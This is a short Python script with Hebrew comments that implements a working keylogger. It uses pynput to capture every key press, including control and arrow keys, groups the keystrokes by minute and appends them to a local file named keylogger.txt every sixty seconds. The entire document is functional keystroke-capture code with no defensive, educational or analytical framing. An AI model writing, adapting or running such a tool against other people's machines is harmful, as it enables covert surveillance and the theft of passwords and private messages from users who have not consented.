from pynput.keyboard import Listener, Key
from datetime import datetime
import threading

# מילון שבו נשמור לחיצות מקשים לפי זמן (פורמט 'שעה:דקה')
logs_by_minute = {}

# עדכון הקובץ כל 60 שניות
def write_to_file_every_minute():
    threading.Timer(60.0, write_to_file_every_minute).start()  # פעולה חוזרת כל דקה

    now = datetime.now().strftime("%H:%M")
    if now in logs_by_minute and logs_by_minute[now]:
        with open("keylogger.txt", "a", encoding='utf-8') as file:
            file.write(f"\n=== {now} ===\n")
            file.write(logs_by_minute[now])
        logs_by_minute[now] = ''  # ננקה אחרי שמירה

# התחלת השעון
write_to_file_every_minute()

def keylogger(key):
    now = datetime.now().strftime("%H:%M")  # קבוצה לפי שעה:דקה

    try:
        key_str = key.char
    except AttributeError:
        # תווים מיוחדים
        if key == Key.space:
            key_str = ' '
        elif key == Key.enter:
            key_str = '\n'
        elif key == Key.tab:
            key_str = '\t'
        elif key == Key.backspace:
            key_str = '[BACKSPACE]'
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            key_str = '[CTRL]'
        elif key == Key.alt_l or key == Key.alt_r:
            key_str = '[ALT]'
        elif key == Key.esc:
            key_str = '[ESC]'
        elif key == Key.up:
            key_str = '[UP]'
        elif key == Key.down:
            key_str = '[DOWN]'
        elif key == Key.left:
            key_str = '[LEFT]'
        elif key == Key.right:
            key_str = '[RIGHT]'
        else:
            key_str = f'[{key}]'

    # שמירה למילון לפי דקה
    if now not in logs_by_minute:
        logs_by_minute[now] = ''
    logs_by_minute[now] += str(key_str)

with Listener(on_press=keylogger) as listener:
    listener.join()